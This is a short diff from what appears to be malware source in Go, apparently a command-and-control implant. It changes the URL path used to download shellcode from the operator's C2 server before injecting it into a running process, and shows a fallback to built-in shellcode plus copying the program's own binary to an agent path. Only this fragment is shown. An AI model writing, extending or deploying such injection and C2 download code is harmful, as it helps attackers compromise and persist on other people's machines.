@@ -260,7 +260,7 @@ func Injector(shellcode *string, pid int) error {
 // InjectShellcode inject shellcode to a running process using various methods
 func InjectShellcode(pid int, method string) (err error) {
 	// prepare the shellcode
-	sc, err := DownloadViaCC(CCAddress+"shellcode.txt", "")
+	sc, err := DownloadViaCC(CCAddress+"www/shellcode.txt", "")
 	if err != nil {
 		sc = []byte(GuardianShellcode)
 		err = util.Copy(os.Args[0], GuardianAgentPath)
